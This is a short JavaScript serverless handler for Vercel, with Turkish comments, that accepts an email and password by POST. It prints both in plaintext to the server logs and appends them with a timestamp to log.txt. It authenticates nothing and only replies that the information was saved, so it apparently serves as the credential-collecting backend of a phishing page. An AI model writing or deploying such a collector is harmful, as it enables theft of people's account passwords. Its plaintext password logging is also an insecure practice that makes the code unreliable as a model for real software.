import fs from 'fs';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body;

    // Konsola yaz (Vercel loglarında görünecek)
    console.log(`E-posta: ${email}, Şifre: ${password}`);

    // Log dosyasına yaz (yerel test için, Vercel’de çalışmaz)
    const logEntry = {
      timestamp: new Date().toISOString(),
      email,
      password
    };
    try {
      fs.appendFileSync('log.txt', JSON.stringify(logEntry) + '\n');
    } catch (err) {
      console.error('Dosya yazma hatası:', err);
    }

    res.status(200).json({ status: 'success', message: 'Bilgiler kaydedildi' });
  } else {
    res.status(405).json({ status: 'error', message: 'Yalnızca POST istekleri destekleniyor' });
  }
}